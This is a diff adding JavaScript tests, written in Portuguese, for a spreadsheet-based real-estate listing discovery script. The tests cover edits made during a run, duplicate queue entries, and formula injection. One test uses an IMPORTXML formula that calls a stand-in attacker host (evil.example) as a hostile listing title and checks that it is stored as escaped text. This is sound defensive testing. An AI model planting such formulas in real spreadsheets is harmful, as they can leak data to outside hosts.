@@ -804,3 +804,65 @@ test('candidato aprovado sem identidade da fonte não é promovido', () => {
   assert.equal(table(sandbox, 'LISTINGS').filter((r) => /^LIST_WEB_/.test(r.listing_id) && !/\d{5,}$/.test(r.listing_id)).length, 0);
   assert.equal(lastRun(sandbox).new_listings, 0);
 });
+
+// --- revisão do PR #182, rodada 3 ---------------------------------------------------------------
+
+test('busca editada durante a execução: o que a URL antiga trouxe não entra', () => {
+  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
+  network(sandbox.context, {
+    [SEARCH_URL]: response(200, searchPage([NEW_1])),
+    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
+  });
+  editDuringRun(sandbox, () => {
+    const header = sandbox.sheets.LISTING_SEARCHES._rows[0];
+    sandbox.sheets.LISTING_SEARCHES._rows[1][header.indexOf('search_url')] = `${SEARCH_URL}?quartos=4`;
+  });
+  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
+  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 0, 'candidato do filtro antigo não entra');
+  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined);
+  assert.equal(table(sandbox, 'LISTING_EVENTS').length, 0);
+  assert.equal(lastRun(sandbox).new_listings, 0);
+  assert.equal(lastRun(sandbox).candidate_rows, 0);
+});
+
+test('mesmo anúncio posto na fila por outro escritor durante a execução não é duplicado', () => {
+  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
+  network(sandbox.context, {
+    [SEARCH_URL]: response(200, searchPage([NEW_1])),
+    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
+  });
+  editDuringRun(sandbox, () => {
+    // Um agente externo grava o mesmo anúncio com outro candidate_id enquanto a busca lia.
+    const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
+    const row = header.map(() => '');
+    Object.entries({ candidate_id: 'CAND_GPT_7', discovered_by: 'agente:gpt', source_name: 'DFImoveis',
+      source_url: NEW_1, external_id: '1400001', status: 'pending' }).forEach(([k, v]) => { row[header.indexOf(k)] = v; });
+    sandbox.sheets.LISTING_CANDIDATES._rows.push(row);
+  });
+  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
+  const cands = table(sandbox, 'LISTING_CANDIDATES');
+  assert.deepEqual(cands.map((c) => c.candidate_id), ['CAND_GPT_7']);
+  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined, 'a promoção sai com o candidato descartado');
+  assert.match(lastRun(sandbox).error_details, /já entrou na fila por outro escritor/);
+});
+
+test('título do portal que começa com = é gravado como texto, nunca como fórmula', () => {
+  const evil = '=IMPORTXML("https://evil.example/x","//a")';
+  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
+  let blocked = true;
+  network(sandbox.context, {
+    [SEARCH_URL]: response(200, searchPage([NEW_1, NEW_2])),
+    [NEW_1]: response(200, listingPage({ price: 6200000, url: NEW_1, title: evil })), // implausível: fica na fila
+    [NEW_2]: () => (blocked ? response(403) : response(200, listingPage({ price: 9900000, area: 70, url: NEW_2, rooms: 3, title: '+SUM(1)' }))),
+  });
+  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
+  const raw = (id) => {
+    const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
+    return sandbox.sheets.LISTING_CANDIDATES._rows.find((r) => r[header.indexOf('external_id')] === id)[header.indexOf('title')];
+  };
+  assert.equal(raw('1400001'), `'${evil}`, 'candidato novo: append');
+  blocked = false;
+  sandbox.context.runListingsDiscovery_({ now: day(1), noContinuation: true });
+  assert.equal(raw('1400002'), "'+SUM(1)", 'candidato existente: regravação por coluna');
+  assert.equal(raw('1400001'), `'${evil}`, 'a coluna regravada não devolve o texto antigo como fórmula');
+});
